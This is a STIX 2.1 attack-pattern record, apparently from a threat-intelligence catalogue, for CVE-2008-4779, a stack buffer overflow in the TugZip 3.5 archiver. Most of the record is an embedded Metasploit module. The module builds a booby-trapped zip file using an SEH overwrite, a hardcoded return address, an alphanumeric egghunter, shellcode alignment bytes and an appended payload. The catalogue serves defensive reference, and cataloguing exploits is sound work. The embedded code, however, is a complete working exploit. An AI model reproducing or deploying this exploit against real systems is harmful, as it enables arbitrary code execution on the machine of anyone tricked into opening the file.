{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f32bfcee-d590-4360-9abe-2c1e739c9cdb",
    "created": "2024-08-14T16:37:15.100053Z",
    "modified": "2024-08-14T16:37:15.100057Z",
    "name": "TugZip 3.5 Zip File Parsing Buffer Overflow Vulnerability",
    "description": " This module exploits a stack-based buffer overflow vulnerability in the latest version 3.5 of TugZip archiving utility. In order to trigger the vulnerability, an attacker must convince someone to load a specially crafted zip file with TugZip by double click or file open. By doing so, an attacker can execute arbitrary code as the victim user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/tugzip.rb",
            "external_id": "tugzip.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4779"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TugZip 3.5 Zip File Parsing Buffer Overflow Vulnerability',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability\n        in the latest version 3.5 of TugZip archiving utility.\n        In order to trigger the vulnerability, an attacker must convince someone\n        to load a specially crafted zip file with TugZip by double click or file open.\n        By doing so, an attacker can execute arbitrary code as the victim user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Stefan Marin', # Vulnerability discovery\n          'Lincoln', # Corelan team. Original exploit\n          'TecR0c <roccogiovannicalvi[at]gmail.com>', # Metasploit module\n          'mr_me <steventhomasseeley[at]gmail.com>',  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '49371' ],\n          [ 'CVE', '2008-4779' ],\n          [ 'BID', '31913' ],\n          [ 'EDB', '12008' ]\n        ],\n      'Platform'       => [ 'win' ],\n      'Payload'        =>\n        {\n          'BadChars'      => \"\\x00\\x0f\\x14\\x15\\x2f\" + (0x80..0xff).to_a.pack('C*'),\n          'DisableNops'   => true, # no need\n          'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'EDI', # Egghunter jmp EDI\n            }\n        },\n\n      'Targets'        =>\n        [\n          [\n            'Universal',\n            {\n              'Ret'    => 0x7e0c307e,\n              # 5.00.2147.1 [ztvcabinet.dll]\n              # POP EBX > POP EBP > RETN\n              'Offset' => 372, # to nseh\n            }\n          ],\n        ],\n      'DisclosureDate' => '2008-10-28',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip']),\n      ])\n\n  end\n\n  def exploit\n\n    # Hardcoded egghunter due to size limit (before nseh destroyed/130D past seh of usable bytes)\n    # base register ESI\n    hunter = \"VYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIK9Jzs\"\n    hunter << \"rbrRJuRRxzmvNWLWuQJt4ZOnXPwtpTpQdLKJZLoPuzJNO3EXgkOJGA\"\n    eggtag = 'w00t' * 2\n\n    getpc_asm = %q{\n      popad\n      popad\n      popad\n      popad\n      popad\n      pop ebx\n    }\n\n    # Align EBX for hunter\n    alignment = Metasm::Shellcode.assemble(Metasm::Ia32.new, getpc_asm).encode_string\n\n    # Align for ESI + factoring mangled chars\n    alignment << \"\\x89\\x05\"              # jmp short (5 bytes) to 'jmp back' at end\n    alignment << \"\\x5e\"                  # pop esi\n    alignment << \"\\x41\"                  # nop (inc ecx)\n    alignment << \"\\x98\\x99\"              # call esi\n    alignment << \"\\x41\"                  # nop (inc ecx)\n    alignment << \"\\x8a\\x94\\x98\\x98\\x98\"  # jmp back to pop esi\n\n    getpc_asm = %q{\n      popad\n      pop esp\n      inc eax\n      inc eax\n    }\n\n    # Realign stack pointer\n    nseh = Metasm::Shellcode.assemble(Metasm::Ia32.new, getpc_asm).encode_string\n\n    seh = [target.ret].pack(\"V*\")\n\n    sploit = rand_text_alpha(target['Offset'])\n    sploit << nseh << seh\n    sploit << alignment\n    sploit << hunter\n    sploit << eggtag << payload.encoded\n\n    zip = Rex::Zip::Archive.new\n    xtra = [0xdac0ffee].pack('V')\n    comment = [0xbadc0ded].pack('V')\n    zip.add_file(sploit, xtra, comment)\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(zip.pack)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-28",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}